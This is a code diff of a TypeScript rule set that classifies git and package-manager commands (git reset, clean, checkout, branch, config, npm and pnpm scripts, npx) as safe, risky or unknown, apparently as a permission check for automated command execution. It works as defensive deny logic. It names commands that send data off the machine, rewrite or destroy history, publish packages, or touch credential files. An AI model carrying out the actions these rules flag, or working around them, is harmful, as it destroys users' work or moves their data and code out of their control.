+  noteEffects(protectedWriteEffects(args, state, context));
   for (const arg of args) {
     if (looksLikeOption(arg.text)) continue;
     const facts = pathFacts(arg.text, state.cwd, context);
@@ -523,6 +903,25 @@ function checkWrites(args: Word[], state: SegmentState, context: CommandContext,
   }
   return safe(`${label} only changes files inside the workspace`);
 }
+
+/** The paths `git restore` discards changes in: its operands, without the value of `-s`/`--source`. */
+function restorePaths(rest: readonly Word[]): Word[] {
+  const out: Word[] = [];
+  for (let index = 0; index < rest.length; index += 1) {
+    const text = rest[index].text;
+    if (text === '--') { out.push(...rest.slice(index + 1)); break; }
+    if (text === '-s' || text === '--source') { index += 1; continue; }
+    if (looksLikeOption(text)) continue;
+    out.push(rest[index]);
+  }
+  return out;
+}
+
+/** git's own commands the rules have no case for: their names are git's, never an alias, so what they are is known even where they are not judged. */
+const GIT_BUILTINS: ReadonlySet<string> = new Set(['init', 'clone', 'worktree', 'submodule', 'apply', 'am', 'archive', 'bisect', 'bundle', 'check-ignore', 'check-attr',
+  'cherry', 'count-objects', 'fsck', 'format-patch', 'maintenance', 'mergetool', 'difftool', 'notes', 'range-diff', 'sparse-checkout', 'verify-commit', 'verify-tag',
+  'ls-remote', 'name-rev', 'request-pull', 'diff-tree', 'diff-files', 'diff-index', 'for-each-ref', 'hash-object', 'help', 'version', 'var', 'column', 'interpret-trailers',
+  'mailinfo', 'mailsplit', 'patch-id', 'pack-refs', 'repack', 'rerere', 'citool', 'gui', 'instaweb', 'lfs', 'fast-export']);
 
 function classifyGit(args: Word[], state: SegmentState, context: CommandContext): CommandClassification {
   let index = 0;
@@ -535,106 +934,255 @@ function classifyGit(args: Word[], state: SegmentState, context: CommandContext)
   const shortFlag = (letters: string) => words.some((word) => /^-[A-Za-z]+$/.test(word) && [...letters].some((letter) => word.includes(letter)));
   const label = `git ${sub}`;
   const writesOrEscapes = words.find((word) => /^--(?:output|no-index|ext-diff|exec|upload-pack|receive-pack|git-dir|work-tree)(?:=|$)|^-o$/.test(word));
+  // `--output=FILE` (or `--output FILE`, `-o FILE`) only writes the file it names; the other options run programs or reach outside the repository.
+  const outputWrite = (): CommandClassification | undefined => {
+    const at = words.findIndex((word) => /^--output(?:=|$)|^-o$/.test(word));
+    if (at < 0 || words.some((word) => /^--(?:no-index|ext-diff|exec|upload-pack|receive-pack|git-dir|work-tree)(?:=|$)/.test(word))) return undefined;
+    const word = rest[at]!;
+    const target = word.text.includes('=') ? { ...word, text: word.text.slice(word.text.indexOf('=') + 1) } : rest[at + 1];
+    return target === undefined ? undefined : writeResult(`${label} writes its output to ${target.text}`, [target], state, context);
+  };
   switch (sub) {
-    case 'push': return risky('git push changes a remote repository');
-    case 'send-email': return risky('git send-email sends data off this machine');
-    case 'rebase': case 'filter-branch': case 'filter-repo': case 'replace': return risky(`${label} rewrites history`);
-    case 'reset': return has('--hard', '--merge', '--keep') ? risky('git reset --hard discards uncommitted changes') : unknown('git reset moves the branch or unstages changes');
-    case 'clean': return words.length && words.every((word) => word === '-n' || word === '--dry-run' || !looksLikeOption(word)) && has('-n', '--dry-run') ? unknown('git clean --dry-run') : risky('git clean deletes untracked files');
+    case 'push': return risky('git push changes a remote repository', publishTo('git-remote'));
+    case 'send-email': return risky('git send-email sends data off this machine', [{ verb: 'send', channel: 'email' }]);
+    case 'rebase': case 'filter-branch': case 'filter-repo': case 'replace': return risky(`${label} rewrites history`, DESTROY_ALL);
+    case 'reset': return has('--hard', '--merge', '--keep') ? risky('git reset --hard discards uncommitted changes', DESTROY_ALL) : unknownRead('git reset moves the branch or unstages changes');
+    case 'clean': {
+      if (words.length && words.every((word) => word === '-n' || word === '--dry-run' || !looksLikeOption(word)) && has('-n', '--dry-run')) return unknownRead('git clean --dry-run');
+      // The paths it is limited to, unless an exclude pattern makes its operands something else.
+      const operands = has('-e', '--exclude') ? [] : rest.filter((arg) => arg.text !== '--' && !looksLikeOption(arg.text));
+      return risky('git clean deletes untracked files', destroyPaths(operands.map((arg) => effectPath(arg, state, context))));
+    }
     case 'checkout':
-      if (words.includes('--') || words.includes('.') || has('-f', '--force', '-B', '--ours', '--theirs', '-p', '--patch')) return risky('git checkout over files discards their uncommitted changes');
+      if (words.includes('--') || words.includes('.') || has('-f', '--force', '-B', '--ours', '--theirs', '-p', '--patch')) {
+        // D-45: discarding uncommitted work is destruction. Only the paths after `--` are surely paths; anything else is the whole tree.
+        const dash = rest.findIndex((arg) => arg.text === '--');
+        const named = dash < 0 ? [] : rest.slice(dash + 1).filter((arg) => !looksLikeOption(arg.text));
+        return risky('git checkout over files discards their uncommitted changes', destroyPaths(named.map((arg) => effectPath(arg, state, context))));
+      }
       if (words[0] === '-b' && words.length === 2 && !looksLikeOption(words[1])) return safe('git checkout -b creates a new branch');
-      return unknown('git checkout may overwrite uncommitted changes');
+      return unknownRead('git checkout may overwrite uncommitted changes');
     case 'switch':
-      if (has('-C', '--force-create', '-f', '--force', '--discard-changes')) return risky('git switch with force discards changes or resets a branch');
+      if (has('-C', '--force-create', '-f', '--force', '--discard-changes')) return risky('git switch with force discards changes or resets a branch', DESTROY_ALL);
       if ((words[0] === '-c' || words[0] === '--create') && words.length === 2 && !looksLikeOption(words[1])) return safe('git switch -c creates a new branch');
       // Without --force, git refuses to switch over uncommitted changes it would lose.
       if (words.length === 1 && !looksLikeOption(words[0])) return safe('git switch changes branch and keeps uncommitted changes');
-      return unknown('git switch changes the checked-out branch');
+      return unknownRead('git switch changes the checked-out branch');
     case 'restore':
       if ((has('--staged') || shortFlag('S')) && !has('--worktree') && !shortFlag('W')) return safe('git restore --staged only unstages changes');
-      return risky('git restore discards uncommitted changes');
+      return risky('git restore discards uncommitted changes', destroyPaths(restorePaths(rest).map((arg) => effectPath(arg, state, context))));
     case 'fetch': case 'pull': {
       // Named remotes only: a URL on the command line could carry data out.
-      if (words.some((word) => !looksLikeOption(word) && /:\/\/|^[\w.-]+@[\w.-]+:|^\/|^\.\.?\//.test(word))) return unknown(`${label} from a URL or path instead of a named remote`);
-      if (writesOrEscapes || has('--force', '-f', '--rebase', '-r', '--prune', '-p', '--prune-tags', '--refmap', '--recurse-submodules')) return unknown(`${label} with options that can rewrite or remove local work`);
+      if (words.some((word) => !looksLikeOption(word) && /:\/\/|^[\w.-]+@[\w.-]+:|^\/|^\.\.?\//.test(word))) return unknownRead(`${label} from a URL or path instead of a named remote`);
+      if (writesOrEscapes || has('--force', '-f', '--rebase', '-r', '--prune', '-p', '--prune-tags', '--refmap', '--recurse-submodules')) return unknownRead(`${label} with options that can rewrite or remove local work`);
       return safe(sub === 'fetch' ? 'git fetch downloads from a named remote and changes no local work' : 'git pull merges from a named remote; git stops before overwriting uncommitted changes');
     }
     case 'merge':
       if (has('--abort', '--continue', '--quit')) return safe(`git merge ${words[0]} finishes or undoes a merge in progress`);
-      if (writesOrEscapes || has('-s', '--strategy', '-X', '--strategy-option', '--allow-unrelated-histories', '--squash')) return unknown('git merge with a strategy option');
-      return words.length && words.every((word) => !looksLikeOption(word) || ['--no-ff', '--ff-only', '--ff', '--no-edit', '--no-commit'].includes(word) || /^-m$/.test(word)) ? safe('git merge records a merge commit, which can be undone') : unknown('git merge');
+      if (writesOrEscapes || has('-s', '--strategy', '-X', '--strategy-option', '--allow-unrelated-histories', '--squash')) return unknownRead('git merge with a strategy option');
+      return words.length && words.every((word) => !looksLikeOption(word) || ['--no-ff', '--ff-only', '--ff', '--no-edit', '--no-commit'].includes(word) || /^-m$/.test(word)) ? safe('git merge records a merge commit, which can be undone') : unknownRead('git merge');
     case 'revert': case 'cherry-pick':
-      if (writesOrEscapes) return unknown(`${label} ${writesOrEscapes}`);
+      if (writesOrEscapes) return outputWrite() ?? unknown(`${label} ${writesOrEscapes}`);
       return safe(`${label} records a new commit locally`);
     case 'mv': case 'rm': {
-      if (has('-f', '--force') || shortFlag('f')) return unknown(`${label} --force can lose uncommitted changes`);
       const operands = rest.filter((arg) => !looksLikeOption(arg.text) && arg.text !== '--');
+      // Forced, it can lose uncommitted changes: a write to each file it names, like a plain rm or mv inside the project.
+      if (has('-f', '--force') || shortFlag('f')) return writeResult(`${label} --force can lose uncommitted changes`, operands, state, context);
       const writes = checkWrites(operands, state, context, label);
       return writes.verdict === 'safe' ? safe(`${label} changes tracked files inside the workspace, which git can restore`) : writes;
     }
     case 'branch':
-      if (has('-d', '-D', '--delete', '-f', '--force', '-m', '-M', '--move', '-c', '-C', '--copy', '--set-upstream-to', '-u', '--unset-upstream', '--edit-description') || shortFlag('dDmMcCfu')) return risky('git branch deletes, moves, or force-updates a branch');
+      if (has('-d', '-D', '--delete', '-f', '--force', '-m', '-M', '--move', '-c', '-C', '--copy', '--set-upstream-to', '-u', '--unset-upstream', '--edit-description') || shortFlag('dDmMcCfu')) {
+        // Destruction: deleting a branch (-d, -D, --delete), force-updating one (-f, --force), and a forced rename or copy (-M, -C, or --move/--copy with
+        // --force), which overwrites an existing branch of the new name and can lose its commits. A plain rename or copy (-m, -c, --move, --copy) keeps
+        // every commit, and an upstream or description change touches none: those are not destruction (still risky, so they ask in the asking modes).
+        const destroys = has('-d', '-D', '--delete', '-f', '--force') || shortFlag('dDfMC');
+        return risky('git branch deletes, moves, or force-updates a branch', destroys ? DESTROY_ALL : undefined);
+      }
       if (words.every((word) => ['-a', '-r', '-v', '-vv', '--list', '--show-current', '--all', '--remotes', '--merged', '--no-merged', '--verbose'].includes(word))) return safe('git branch lists branches');
-      return unknown('git branch with arguments');
+      return unknownRead('git branch with arguments');
     case 'tag':
-      if (has('-d', '--delete', '-f', '--force') || shortFlag('df')) return risky('git tag deletes or moves a tag');
-      return words.every((word) => ['-l', '--list', '-n'].includes(word)) ? safe('git tag lists tags') : unknown('git tag creates a tag');
+      if (has('-d', '--delete', '-f', '--force') || shortFlag('df')) return risky('git tag deletes or moves a tag', DESTROY_ALL);
+      return words.every((word) => ['-l', '--list', '-n'].includes(word)) ? safe('git tag lists tags') : unknownRead('git tag creates a tag');
     case 'stash':
-      if (words[0] === 'drop' || words[0] === 'clear') return risky('git stash drop or clear deletes stashed work');
+      if (words[0] === 'drop' || words[0] === 'clear') return risky('git stash drop or clear deletes stashed work', DESTROY_ALL);
       if (words[0] === 'list' || words[0] === 'show') return safe(`git stash ${words[0]} only reads`);
       if (!words.length || (['push', 'save', 'pop', 'apply'].includes(words[0]) && words.slice(1).every((word) => ['-m', '--message', '-u', '--include-untracked', '--index', '-q'].includes(word) || !looksLikeOption(word)))) return safe('git stash sets changes aside or brings them back, keeping them recoverable');
-      return unknown('git stash changes the working tree');
+      return unknownRead('git stash changes the working tree');
     case 'remote':
       if (!words.length || (words.length === 1 && (words[0] === '-v' || words[0] === '--verbose'))) return safe('git remote lists remotes');
       if (['add', 'remove', 'rm', 'set-url', 'rename', 'prune', 'set-head', 'set-branches'].includes(words[0])) return risky('git remote changes where this repository pushes and fetches');
-      return unknown('git remote');
+      return unknownRead('git remote');
     case 'config':
       if (has('--global', '--system')) return risky('git config --global changes git settings outside this workspace');
-      return unknown('git config changes or prints repository settings');
-    case 'reflog': return words[0] === 'expire' || words[0] === 'delete' ? risky('git reflog expire or delete destroys recovery points') : safe('git reflog only reads');
-    case 'gc': case 'prune': return risky(`${label} can permanently remove unreachable commits`);
-    case 'update-ref': return risky('git update-ref rewrites references directly');
+      {
+        // Reading a setting writes nothing; setting one writes the repository's .git/config (a protected place, so the floor asks); --file names the file.
+        const fileAt = words.findIndex((word) => /^(?:-f|--file)(?:=|$)/.test(word));
+        const known = /^(?:--(?:get|get-all|get-regexp|get-urlmatch|list|show-origin|show-scope|name-only|null|local|worktree|unset|unset-all|add|replace-all|rename-section|remove-section|bool|int|path|type(?:=\S+)?|default(?:=\S+)?|includes|no-includes)|-[lz]|(?:-f|--file)(?:=\S+)?)$/;
+        if (words.some((word, at) => looksLikeOption(word) && !known.test(word) && !(fileAt >= 0 && at === fileAt + 1))) return unknown('git config with an option the rules do not check');
+        const positional = words.filter((word, at) => !looksLikeOption(word) && !(fileAt >= 0 && at === fileAt + 1 && !words[fileAt]!.includes('=')));
+        const reads = has('--get', '--get-all', '--get-regexp', '--get-urlmatch', '--list', '-l') || (positional.length <= 1 && !has('--unset', '--unset-all', '--add', '--replace-all', '--rename-section', '--remove-section'));
+        if (reads) return unknownRead('git config prints repository settings');
+        const file = fileAt < 0 ? undefined : words[fileAt]!.includes('=') ? { ...rest[fileAt]!, text: words[fileAt]!.slice(words[fileAt]!.indexOf('=') + 1) } : rest[fileAt + 1];
+        return writeResult('git config changes repository settings', [file ?? { text: path.join(path.relative(state.cwd, context.root) || '.', '.git', 'config'), quoted: false, glob: false, expansion: false }], state, context);
+      }
+    case 'reflog': return words[0] === 'expire' || words[0] === 'delete' ? risky('git reflog expire or delete destroys recovery points', DESTROY_ALL) : safe('git reflog only reads');
+    case 'gc': case 'prune': return risky(`${label} can permanently remove unreachable commits`, DESTROY_ALL);
+    case 'update-ref': return risky('git update-ref rewrites references directly', DESTROY_ALL);
     case 'status': case 'diff': case 'log': case 'show': case 'blame': case 'shortlog': case 'describe': case 'rev-parse': case 'ls-files': case 'grep': case 'whatchanged': case 'show-ref': case 'ls-tree': case 'cat-file': case 'merge-base': case 'rev-list':
-      if (writesOrEscapes) return unknown(`${label} ${writesOrEscapes} can write files or read outside the repository`);
+      if (writesOrEscapes) return outputWrite() ?? unknown(`${label} ${writesOrEscapes} can write files or read outside the repository`);
     {
       const reads = checkReads(rest, state, context, label);
       return reads.verdict === 'safe' ? safe(`${label} only reads the repository`) : reads;
     }
     case 'add': {
-      if (writesOrEscapes) return unknown(`${label} ${writesOrEscapes}`);
+      if (writesOrEscapes) return outputWrite() ?? unknown(`${label} ${writesOrEscapes}`);
       const reads = checkReads(rest, state, context, label);
       return reads.verdict === 'safe' ? safe('git add stages changes inside the workspace') : reads;
     }
     case 'commit':
-      if (has('--amend')) return unknown('git commit --amend rewrites the last commit');
-      if (has('--no-verify') || shortFlag('n')) return unknown('git commit --no-verify skips the repository\'s hooks');
-      if (writesOrEscapes) return unknown(`${label} ${writesOrEscapes}`);
+      if (has('--amend')) return unknownRead('git commit --amend rewrites the last commit', DESTROY_ALL);
+      if (has('--no-verify') || shortFlag('n')) return unknownRead('git commit --no-verify skips the repository\'s hooks');
+      if (writesOrEscapes) return outputWrite() ?? unknown(`${label} ${writesOrEscapes}`);
       return words.some((word) => !looksLikeOption(word) && isSensitivePath(word)) ? risky('git commit names a credential file') : safe('git commit records changes locally');
-    default: return unknown(`git ${sub || '(no subcommand)'} is not one the rules know`);
+    // A git command of its own (git init, git worktree, ...) is read; any other name may be an alias that runs anything (`!git push`).
+    case 'format-patch': case 'archive': {
+      // These write files the text names (PR #74 review round 10): format-patch into -o/--output-directory (or the current folder), archive into -o/--output.
+      if (words.some((word) => /^--(?:no-index|ext-diff|exec|upload-pack|receive-pack|git-dir|work-tree|remote)(?:=|$)/.test(word))) return unknown(`${label} with an option that runs programs or reaches outside the repository`);
+      const option = sub === 'format-patch' ? /^(?:-o|--output-directory)$/ : /^(?:-o|--output)$/;
+      const inline = sub === 'format-patch' ? /^(?:--output-directory=|-o)(.+)$/ : /^(?:--output=|-o)(.+)$/;
+      const at = rest.findIndex((arg) => option.test(arg.text) || inline.test(arg.text));
+      if (at < 0) {
+        if (sub === 'archive') return unknownRead('git archive writes to its output stream');
+        return writeResult('git format-patch writes patch files into the current folder', [{ text: '.', quoted: false, glob: false, expansion: false }], state, context);
+      }
+      const match = inline.exec(rest[at]!.text);
+      const target = option.test(rest[at]!.text) ? rest[at + 1] : { ...rest[at]!, text: match![1]! };
+      return target === undefined ? unknown(`${label} without its output`) : writeResult(`${label} writes its output to ${target.text}`, [target], state, context);
+    }
+    case 'bundle': {
+      if (rest[0]?.text !== 'create') return unknownRead(`git bundle ${rest[0]?.text ?? ''} reads a bundle`.trim());
+      const file = rest.slice(1).find((arg) => !looksLikeOption(arg.text));
+      return file === undefined ? unknown('git bundle create without a file') : writeResult(`git bundle create writes ${file.text}`, [file], state, context);
+    }
+    default: return GIT_BUILTINS.has(sub) ? unknownRead(`git ${sub} is not one the rules know`) : unknown(`git ${sub || '(no subcommand)'} is not one the rules know`);
   }
 }
 
-function checkScript(name: string, state: SegmentState, context: CommandContext, runner: string, depth: number): CommandClassification {
-  if (RELEASE_NAME.test(name)) return risky(`${runner} ${name} looks like a publish, release, or deploy script`);
-  const scripts = context.packageScripts ?? {};
+/**
+ * The scripts a package manager run in `folder` (the shell's folder when not given) would use, or why they cannot be known. A folder decided at run time,
+ * one outside the project, and a package.json that cannot be read are all unknown: the command's effects are unknown, never "a project script".
+ */
+function scriptsIn(folder: string | undefined, state: SegmentState, context: CommandContext): { scripts: Readonly<Record<string, string>>; folder: string } | { unknown: string } {
+  if (folder === undefined && state.cwdUnknown !== undefined) return { unknown: state.cwdUnknown };
+  const at = path.resolve(folder ?? state.cwd);
+  if (!isInside(context.root, at)) return { unknown: 'it runs scripts from a folder outside the project' };
+  if (context.packageScriptsAt === undefined) {
+    // No reader: only the project root's scripts are known, and only when the caller read them (packageScripts). Scripts nobody read are unknown, never an
+    // empty set (PR #74 review round 6): an empty set would read every script name as a harmless project script.
+    if (context.packageScripts === undefined) return { unknown: 'the package.json it would run scripts from was not read' };
+    if (at !== path.resolve(context.root)) return { unknown: 'it runs the scripts of a folder whose package.json was not read' };
+    return { scripts: context.packageScripts, folder: at };
+  }
+  const found = context.packageScriptsAt(at);
+  if (found.kind === 'none') return { scripts: {}, folder: at };
+  if (found.kind === 'unreadable') return { unknown: 'the package.json it would run scripts from could not be read' };
+  if (found.kind === 'outside' || !isInside(context.root, found.folder)) return { unknown: 'it runs scripts from a package.json outside the project' };
+  return { scripts: found.scripts, folder: found.folder };
+}
+
+function checkScript(name: string, state: SegmentState, context: CommandContext, runner: string, depth: number, folder?: string): CommandClassification {
+  const source = scriptsIn(folder, state, context);
+  if ('unknown' in source) {
+    const stopped = beyondReach(`${runner} ${name}: ${source.unknown}`);
+    // A release-like name still says what it does on its own word, as it does when the scripts are known.
+    return RELEASE_NAME.test(name) ? risky(`${runner} ${name} looks like a publish, release, or deploy script`, publishTo('release')) : stopped;
+  }
+  const scripts = source.scripts;
+  // Every script npm would run is read, even after one has decided the verdict, so what the later ones publish or destroy is still seen.
+  let decided: CommandClassification | undefined;
+  const mark = effectMark();
   for (const key of [`pre${name}`, name, `post${name}`]) {
     const body = scripts[key];
-    if (typeof body !== 'string' || depth >= 3) continue;
-    const inner = classifyText(body, { ...context, cwd: state.cwd }, depth + 1);
-    if (inner.verdict === 'risky') return risky(`${runner} ${name} runs the "${key}" script (${body.length > 120 ? `${body.slice(0, 120)}…` : body}), and ${inner.reason}`);
+    if (typeof body !== 'string') continue;
+    // A script that runs scripts (or itself) stops at the one bound, inside classifyText, with its effects unknown.
+    // The script runs in its package's own folder.
+    const inner = classifyText(body, { ...context, cwd: source.folder }, depth + 1);
+    if (inner.verdict === 'risky') decided ??= risky(`${runner} ${name} runs the "${key}" script (${body.length > 120 ? `${body.slice(0, 120)}…` : body}), and ${inner.reason}`, inner.effects);
   }
-  return safe(`${runner} ${name} runs a project script`);
+  // A release-like name is a publish on its own word; when the script body already says where it publishes, that is the tag.
+  const publishes = effectsSince(mark).some((effect) => effect.verb === 'publish' || effect.verb === 'send');
+  if (RELEASE_NAME.test(name)) return risky(`${runner} ${name} looks like a publish, release, or deploy script`, publishes ? undefined : publishTo('release'));
+  return decided ?? safe(`${runner} ${name} runs a project script`);
 }
 
-function classifyPackageManager(manager: string, args: Word[], state: SegmentState, context: CommandContext, depth: number): CommandClassification {
-  const words = args.map((arg) => arg.text);
-  if (words.some((word) => /^--(?:prefix|global|location|userconfig|globalconfig|registry)(?:=|$)/.test(word) || word === '-g')) return unknown(`${manager} with --prefix, --global, or a registry option acts outside the workspace`);
+/**
+ * The folder a package manager's options send it to (npm --prefix and -C, yarn and bun --cwd, pnpm -C and --dir, npm --workspace given a package folder),
+ * with the options taken out of the words; or why its scripts cannot be known (a run-time folder, a workspace by name, every workspace, a filter).
+ */
+function packageManagerFolder(manager: string, args: Word[], state: SegmentState, context: CommandContext): { args: Word[]; folder?: string } | { unknown: string } {
+  const folderOptions = manager === 'npm' ? ['--prefix', '-C'] : manager === 'pnpm' ? ['-C', '--dir'] : ['--cwd'];
+  const spread = manager === 'npm' ? /^(?:--workspaces|-ws|--include-workspace-root)$/ : manager === 'pnpm' ? /^(?:-r|--recursive|--filter|-F|-w|--workspace-root|--filter=.*|--filter-prod.*)$/ : manager === 'bun' ? /^--filter(?:=.*)?$/ : /^$/;
+  const kept: Word[] = [];
+  let folder: string | undefined;
+  for (let index = 0; index < args.length; index += 1) {
+    const arg = args[index];
+    if (arg.text === '--') { kept.push(...args.slice(index)); break; }
+    if (spread.test(arg.text)) return { unknown: `${arg.text} runs scripts in other packages` };
+    const [option, inline] = arg.text.includes('=') ? [arg.text.slice(0, arg.text.indexOf('=')), arg.text.slice(arg.text.indexOf('=') + 1)] : [arg.text, undefined];
+    const workspace = manager === 'npm' && (option === '--workspace' || option === '-w');
+    if (!folderOptions.includes(option) && !workspace) { kept.push(arg); continue; }
+    const value = inline !== undefined ? { ...arg, text: inline } : args[index + 1];
+    if (inline === undefined) index += 1;
+    if (value === undefined || value.expansion || value.glob) return { unknown: `${option} names a folder decided at run time` };
+    // npm resolves a workspace from the project's root; a workspace given by name (not a folder with its own package.json) is not resolved here.
+    const target = path.resolve(workspace ? context.root : state.cwd, value.text);
+    if (workspace) {
+      const found = context.packageScriptsAt?.(target);
+      if (found === undefined || found.kind !== 'found' || path.resolve(found.folder) !== target) return { unknown: `${option} ${value.text} names a workspace the rules do not read by name` };
+    }
+    folder = target;
+  }
+  return { args: kept, ...(folder === undefined ? {} : { folder }) };
+}
+
+/** Subcommands of pnpm and bun that are their own, not a script of the same name. */
+const PNPM_BUN_COMMANDS = new Set(['add', 'install', 'i', 'remove', 'rm', 'uninstall', 'update', 'up', 'upgrade', 'link', 'unlink', 'dlx', 'x', 'exec', 'create', 'init', 'pack', 'publish', 'outdated', 'list', 'ls', 'why', 'store', 'config', 'set', 'get', 'audit', 'import', 'prune', 'patch', 'rebuild', 'root', 'bin', 'env', 'setup', 'server', 'fetch', 'deploy', 'build', 'test', 't', 'run', 'start', 'pm', 'repl', 'help']);
+
+function classifyPackageManager(manager: string, givenArgs: Word[], state: SegmentState, context: CommandContext, depth: number): CommandClassification {
+  const result = classifyPackageManagerIn(manager, givenArgs, state, context, depth);
+  // Reading the right folder's scripts never makes a command newly safe (PR #74 review round 4): a folder option, npm start, stop and restart, and a pnpm or
+  // bun script by name were never safe before, so a safe reading of one stays unknown, as it was; a risky one is risky.
+  if (result.verdict !== 'safe') return result;
+  const words = givenArgs.map((arg) => arg.text);
   const first = words.findIndex((word) => !looksLikeOption(word));
   const sub = first >= 0 ? words[first] : '';
+  const folderOption = words.some((word) => /^(?:--prefix|-C|--cwd|--dir|--workspace|-w)(?:=|$)/.test(word));
+  const newlyRead = (manager === 'npm' && ['start', 'stop', 'restart'].includes(sub)) || ((manager === 'pnpm' || manager === 'bun') && sub !== '' && !PNPM_BUN_COMMANDS.has(sub));
+  if (folderOption) return unknownRead(`${manager} with a folder option runs in another folder`);
+  if (newlyRead) return unknownRead(`${manager} ${sub} can install or run code the rules cannot check`);
+  return result;
+}
+
+function classifyPackageManagerIn(manager: string, givenArgs: Word[], state: SegmentState, context: CommandContext, depth: number): CommandClassification {
+  const located = packageManagerFolder(manager, givenArgs, state, context);
+  if ('unknown' in located) return beyondReach(`${manager}: ${located.unknown}`);
+  const args = located.args;
+  const folder = located.folder;
+  // A package manager runs the scripts (and the install hooks) of the folder it runs in: one this line cannot show, or one outside the project, is unknown.
+  if (folder === undefined && state.cwdUnknown !== undefined) return beyondReach(`${manager}: ${state.cwdUnknown}`);
+  if (!isInside(context.root, folder ?? state.cwd)) return beyondReach(`${manager} runs in a folder outside the project`);
+  const words = args.map((arg) => arg.text);
+  // Its global options are skipped first, so a value option (`npm --tag beta publish`) never hides the subcommand; one the rules do not know makes the
+  // effects unknown (PR #74 review round 7).
+  const leading = skipGlobals(manager, args);
+  if ('unknown' in leading) return beyondReach(`${manager}: ${leading.unknown}`);
+  const first = leading.rest.length > 0 ? args.length - leading.rest.length : -1;
+  const sub = first >= 0 ? words[first] ?? '' : '';
   const extra = first >= 0 ? args.slice(first + 1) : [];
-  if (words.slice(first, first + 2).some((word) => word === 'publish' || word === 'unpublish')) return risky(`${manager} ${words.slice(first, first + 2).join(' ')} publishes a package`);
-  if (['publish', 'unpublish', 'deprecate', 'dist-tag', 'owner', 'adduser', 'login', 'logout', 'token', 'access', 'team', 'org', 'star', 'hook', 'npm-publish'].includes(sub)) return risky(`${manager} ${sub} changes a package registry or your account`);
+  if (first >= 0 && words.slice(first, first + 2).some((word) => word === 'publish' || word === 'unpublish')) return risky(`${manager} ${words.slice(first, first + 2).join(' ')} publishes a package`, publishTo('registry'));
+  if (['publish', 'unpublish', 'deprecate', 'dist-tag', 'owner', 'adduser', 'login', 'logout', 'token', 'access', 'team', 'org', 'star', 'hook', 'npm-publish'].includes(sub)) return risky(`${manager} ${sub} changes a package registry or your account`, publishTo('registry'));
+  if (words.some((word) => /^--(?:prefix|global|location|userconfig|globalconfig|registry)(?:=|$)/.test(word) || word === '-g')) return unknownRead(`${manager} with --prefix, --global, or a registry option acts outside the workspace`);
   if (sub === 'config' || sub === 'set') return risky(`${manager} ${sub} changes package-manager settings outside the workspace`);
   if (sub === 'version' && extra.length) return unknown(`${manager} version changes the version and may tag a release`);
   // Installing exactly what the lockfile declares (no package names); adding packages goes to the safety model.
@@ -642,28 +1190,37 @@ function classifyPackageManager(manager: string, args: Word[], state: SegmentSta
   if (installs && words.every((word) => word === sub || LOCKFILE_INSTALL_OPTIONS.test(word))) return safe(`${manager} ${sub || 'install'} installs what the project's lockfile already lists`);
   const extraCheck = checkReads(extra.filter((arg) => arg.text !== '--'), state, context, `${manager} ${sub}`);
   if (extraCheck.verdict !== 'safe') return extraCheck;
-  if (['test', 't', 'tst'].includes(sub)) return checkScript('test', state, context, manager, depth);
+  if (['test', 't', 'tst'].includes(sub)) return checkScript('test', state, context, manager, depth, folder);
   if (['run', 'run-script', 'rum', 'urn'].includes(sub)) {
     const script = extra.find((arg) => !looksLikeOption(arg.text));
     if (!script) return safe(`${manager} run lists the project scripts`);
-    return checkScript(script.text, state, context, `${manager} run`, depth);
+    return checkScript(script.text, state, context, `${manager} run`, depth, folder);
   }
-  if (['build', 'lint', 'typecheck', 'check', 'start'].includes(sub) && manager !== 'npm') return checkScript(sub, state, context, manager, depth);
-  if (manager === 'yarn' && sub && !['add', 'install', 'remove', 'upgrade', 'up', 'dlx', 'exec', 'create', 'init', 'link', 'unlink', 'global', 'cache', 'set', 'plugin', 'npm', 'pack', 'workspace', 'workspaces'].includes(sub)) return checkScript(sub, state, context, manager, depth);
-  if (['ls', 'list', 'outdated', 'view', 'info', 'why', 'explain', 'help', '--version', '-v'].includes(sub) || (!sub && words.some((word) => word === '--version' || word === '-v'))) return unknown(`${manager} ${sub} may contact the registry`);
-  return unknown(`${manager} ${sub || ''} can install or run code the rules cannot check`.replace(/\s+/g, ' '));
+  // npm start, stop and restart run the scripts of those names (restart runs stop, then start).
+  if (manager === 'npm' && ['start', 'stop', 'restart'].includes(sub)) return checkScript(sub, state, context, manager, depth, folder);
+  if (['build', 'lint', 'typecheck', 'check', 'start'].includes(sub) && manager !== 'npm') return checkScript(sub, state, context, manager, depth, folder);
+  if (manager === 'yarn' && (sub === 'workspace' || sub === 'workspaces')) return beyondReach(`yarn ${sub} runs scripts in other packages`);
+  if (manager === 'yarn' && sub && !['add', 'install', 'remove', 'upgrade', 'up', 'dlx', 'exec', 'create', 'init', 'link', 'unlink', 'global', 'cache', 'set', 'plugin', 'npm', 'pack'].includes(sub)) return checkScript(sub, state, context, manager, depth, folder);
+  // pnpm and bun run a script by its name too, when it is not one of their own commands.
+  if ((manager === 'pnpm' || manager === 'bun') && sub && !looksLikeOption(sub) && !PNPM_BUN_COMMANDS.has(sub)) {
+    const source = scriptsIn(folder, state, context);
+    if ('unknown' in source || typeof source.scripts[sub] === 'string') return checkScript(sub, state, context, manager, depth, folder);
+  }
+  if (['ls', 'list', 'outdated', 'view', 'info', 'why', 'explain', 'help', '--version', '-v'].includes(sub) || (!sub && words.some((word) => word === '--version' || word === '-v'))) return unknownRead(`${manager} ${sub} may contact the registry`);
+  return unknownRead(`${manager} ${sub || ''} can install or run code the rules cannot check`.replace(/\s+/g, ' '));
 }
 
 function classifyNpx(args: Word[], state: SegmentState, context: CommandContext, depth: number): CommandClassification {
   const index = args.findIndex((arg) => !looksLikeOption(arg.text));
-  if (index < 0) return unknown('npx without a tool');
-  if (args.slice(0, index).some((arg) => !['--no-install', '--no', '-q', '--quiet'].includes(arg.text))) return unknown('npx options can install packages');
+  if (index < 0) return unknownRead('npx without a tool');
+  if (args.slice(0, index).some((arg) => !['--no-install', '--no', '-q', '--quiet'].includes(arg.text))) return unknownRead('npx options can install packages');
   const tool = args[index].text;
   const rest = args.slice(index + 1);
-  if (tool === 'vsce' || tool === '@vscode/vsce' || tool === 'ovsx') return rest[0]?.text === 'publish' || rest[0]?.text === 'unpublish' ? risky(`npx ${tool} publish publishes an extension`) : unknown(`npx ${tool}`);
-  if (/^(?:semantic-release|np|release-it|changeset|lerna|gh-pages|vercel|netlify|firebase|wrangler|serverless|sls|cdk)$/.test(tool) || RELEASE_NAME.test(rest.map((arg) => arg.text).join(' '))) return risky(`npx ${tool} can publish, release, or deploy`);
-  if (!DEV_TOOLS.has(tool)) return unknown(`npx ${tool} may download and run a package`);
